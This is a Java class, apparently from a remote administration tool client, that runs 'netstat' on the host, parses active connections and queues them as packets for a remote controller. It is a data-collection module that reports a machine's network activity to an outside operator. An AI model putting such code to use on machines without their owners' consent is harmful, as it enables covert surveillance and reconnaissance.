package com.redpois0n;
import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.packets.outgoing.Header;


public class Netstat extends Thread {
	
	public void run() {
		try {
			Process p = Runtime.getRuntime().exec("netstat");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			reader.readLine();
			reader.readLine();
			reader.readLine();
			reader.readLine();
			
			String line;
			
			while ((line = reader.readLine()) != null) {
				line = line.trim().replaceAll(" +", " ");
				
				PacketBuilder packet = new PacketBuilder(Header.ACTIVE_PORT);
				String[] args = line.split(" ");
				
				packet.add(args[0]);
				packet.add(args[1]);
				packet.add(args[2]);
				packet.add(args[3]);
				
				Connection.addToSendQueue(packet);
			}
			reader.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
